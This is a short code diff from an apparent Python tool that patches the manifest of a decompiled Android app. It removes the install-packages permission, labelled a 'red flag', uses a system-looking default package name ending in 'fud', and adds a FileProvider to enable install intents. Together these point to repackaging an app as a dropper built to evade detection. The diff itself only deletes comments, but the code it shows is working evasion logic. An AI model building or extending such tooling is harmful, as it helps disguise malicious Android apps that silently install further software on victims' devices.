@@ -40,16 +40,13 @@ def _patch_manifest(decompiled_dir: str):
             root.remove(pm)
             print("[✓] REQUEST_INSTALL_PACKAGES removed (was red flag)")
 
-    # FileProvider add karo — install intent ke liye chahiye, permission-free
     app = root.find("application")
     if app is None:
         app = ET.SubElement(root, "application")
 
-    # FileProvider authority
     pkg = root.get("package") or "com.system.fud"
     authority = f"{pkg}.fileprovider"
 
-    # Check if provider already exists
     has_fp = False
     for prov in app.findall("provider"):
         if prov.get(f"{{{ANDROID_NS}}}authorities") == authority:
